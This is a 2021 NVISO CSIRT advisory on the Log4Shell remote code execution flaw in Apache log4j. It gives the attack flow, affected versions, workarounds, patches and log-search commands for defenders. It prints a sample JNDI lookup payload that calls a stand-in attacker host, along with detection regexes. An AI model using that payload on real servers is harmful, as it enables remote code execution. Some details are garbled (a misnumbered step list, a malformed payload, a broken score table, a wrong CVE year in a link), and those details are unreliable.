## NVISO CSIRT ADVISORY
**2021-12-10**


## SUMMARY
In this advisory we provide an overview of the recently discovered vulnerability in Apache log4j and how attackers can abuse it. We will update this blog post as more information is released. 

A high severity vulnerability in Apache log4j was disclosed publicly on 9 December 2021. This vulnerability was initially discovered by Chen Zhaojun of the Alibaba Cloud Security Team.

Log4j is an open-source Java logging library that is widely used in many applications and is present as a dependency in many services. This includes enterprise applications and numerous cloud services. 
 
This vulnerability allows for unauthenticated remote code execution using the following flow:
1.	Attacker sends data to the server (via any protocol). 
2.	The server (with log4j enabled) logs the data in the request, containing the malicious payload: `${jndi:ldap//attackerowneddomain.com/a}`
3.	The log4j vulnerability is triggered by this payload and the server makes a request to the attackerowneddomain.com via JNDI (Java Naming and Directory Interface). This also works using RMI (see link to SANS ISC post below)
5.	The attacker owned server responds to the request with a path to a remote (malicious) Java class file. This file is then injected in in the server process
6.	This malicious Java class file upon execution can trigger arbitrary code execution

## WHY THIS MATTERS
Given how widespread this library is used and how easy the exploit is, the impact of this vulnerability can be seen as very severe. 

On 10 December 2021 a PoC (Proof of Concept) was released for this vulnerability (https://github.com/tangxiaofeng7/apache-log4j-poc). Currently extensive scanning is being performed and a number of active exploitation attempts have been observed as well. 

## AFFECTED PRODUCTS
All Apache log4j versions from 2.0 up to and including 2.14.1 

All frameworks that use these versions (e.g. Apache Structs2, Apache Solr, Apache Druid, Apache Flink, etc.)


## AVAILABLE WORKAROUNDS
It is important to note that as part of the exploitation of this vulnerability, the vulnerable server must make an outbound request to the attacker owned server. Limiting outbound internet connectivity from web servers would prevent the full exploit chain. 

Set to the JVM args log4j2.formatMsgNoLookups set to True in case not patched. (see: https://logging.apache.org/log4j/2.x/manual/configuration.html)

Sanitize log data before processing into Log4j

## AVAILABLE PATCHES
On December 10, 2021, version 2.15.0 was released. 
(https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2)

## DETECTIONS
- Review logs generated for Log4j processing and focus on JNDI and RMI entries
- Review outbound connections of system running Log4j
- YARA rule by Florian Roth: https://gist.github.com/Neo23x0/e4c8b03ff8cdf1fa63b7d15db6e3860b

Search logs using following commands:

`sudo egrep -i -r '\$\{jndi:(ldap[s]?|rmi|dns):/[^\n]+' /var/log`

`sudo find /var/log -name \*.gz -print0 | xargs -0 zgrep -E -i '\$\{jndi:(ldap[s]?|rmi|dns):/[^\n]+'`

## CVSS SCORE AND CVE ID
|CVE ID	|Severity	|CVSSv3 Score|
|-------|-----------|------------|
|CVE-2021-44228	|Critical	|X	|X	|

Note: this vulnerability is also known as log4shell
NIST: http://nvd.nist.gov/vuln/detail/CVE-2020-44228
MITRE: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228


## RECOMMENDED ACTIONS
Critical risk vulnerabilities should be fully patched as soon as possible.


## MORE INFORMATION
More information and detailed explanations on the working of this vulnerability can be found on the links below.
- Log4Shell: RCE 0-day exploit found in log4j, a popular Java logging package: https://www.lunasec.io/docs/blog/log4j-zero-day/
- SANS ISC - RCE in log4j, Log4Shell, or how things can get bad quickly: https://isc.sans.edu/forums/diary/RCE+in+log4j+Log4Shell+or+how+things+can+get+bad+quickly/28120/
- Greynoise is tracking the RCE attempts: https://www.greynoise.io/viz/query/?gnql=tags%3A%22Apache%20Log4j%20RCE%20Attempt%22
- CIRCL.LU TR-65 - Vulnerabilities and Exploitation of Log4j (Remote code injection in Log4j): https://www.circl.lu/pub/tr-65/
